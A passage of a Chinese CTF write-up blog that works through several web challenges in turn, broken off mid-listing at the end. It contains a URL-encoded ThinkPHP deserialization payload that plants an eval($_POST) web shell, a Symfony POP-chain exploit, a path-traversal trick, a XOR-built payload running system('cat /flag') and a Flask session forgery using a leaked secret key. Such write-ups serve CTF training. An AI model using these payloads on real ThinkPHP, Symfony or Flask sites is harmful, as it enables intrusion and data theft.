'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')'''</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> key<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key2<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/app/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> encode<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span><span class="token punctuation">,</span> <span class="token string">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"/app/flag"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用这个函数反向跑出flag即可</p>        <h2 id="安洵杯-2019-iamthinking"   >          <a href="#安洵杯-2019-iamthinking" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://www.zip下载源码/" >www.zip下载源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='../test.jpg'"</span><span class="token operator">.</span><span class="token string double-quoted-string">"/>"</span><span class="token punctuation">;</span>        <span class="token variable">$paylaod</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$paylaod</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^O/i"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'STOP HACKING'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$paylaod</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里有个反序列化，没有其他的方法了，只能看thinkPHP的反序列化漏洞了，至于其中的对第一个匹配的绕过，看<span class="exturl"><a class="exturl__link"   href="https://www.cnblogs.com/tr1ple/p/11137159.html" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，其中thinkPHP的反序列化链子可以用<span class="exturl"><a class="exturl__link"   href="https://github.com/wh1t3p1g/phpggc" >这个</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>工具生成</p><p>最终payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;public&#x2F;?payload&#x3D;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000001dae5f69000000005d7b61f7%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"   >          <a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2>      <p>从头开始找反序列化链子呗</p><p>/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php中的<code>__destruct</code>方法为起始点，跟进<code>commit</code>方法，跟进<code>invalidateTags</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$items</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span><span class="token operator">-></span><span class="token function">saveDeferred</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">getTagsByKey</span><span class="token punctuation">;</span>    <span class="token variable">$tagsByKey</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$items</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处调用了pool的saveDeferred方法，pool可控，但是在<code>__construct</code>中限定了pool的类型需要是<code>AdapterInterface</code>，下一步就是找一个是<code>AdapterInterface</code>并且带有<code>saveDeferred</code>方法的类，看到这里/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php的<code>saveDeferred</code>，传入变量要求为<code>CacheItemInterface</code>类，全局搜索该类</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141634553.png"></p><p>条件满足继续走方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">values</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">!==</span> <span class="token function"><span class="token punctuation">\</span>count</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$values</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">values</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">values</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$values</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处include了文件，最终的文件读取，按照上述内容构造exp，注意命名空间</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache</span><span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheItem</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>CacheItem</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PhpArrayAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TagAwareAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$deferred</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$pool</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">CacheItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PhpArrayAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TagAwareAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="virink-2019-files-share"   >          <a href="#virink-2019-files-share" class="heading-link"><i class="fas fa-link"></i></a><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2>      <p>看源码，uploads文件夹，随便点一个文件看参数，任意文件读取，此处要绕一下../，变成…//</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141718491.png"></p>        <h2 id="NESTCTF-2019-Love-Math-2"   >          <a href="#NESTCTF-2019-Love-Math-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2>      <p>和Love Math一样，构造_GET来自己塞东西进去</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="PASECA2019-honey-shop"   >          <a href="#PASECA2019-honey-shop" class="heading-link"><i class="fas fa-link"></i></a><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2>      <p>提示图片点击可以下载，任意文件读取</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151413306.png"></p><p>读取到环境变量中的<code>SECRET_KEY=Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR</code>，源码读不到但是知道是python环境，flask-session伪造</p><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s &quot;私钥&quot;  -t &quot;内容&quot; python3 flask_session_cookie_manager3.py encode -s &quot;Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR&quot;  -t &quot;&#123;&#39;balance&#39;:114514&#125;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h2 id="GYCTF2020-Node-Game"   >          <a href="#GYCTF2020-Node-Game" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2>      <p>源码喵喵</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> morgan <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">dest</span><span class="token operator">:</span> <span class="token string">'./dist'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">'short'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/uploads"</span><span class="token punctuation">,</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/template"</span><span class="token punctuation">,</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token 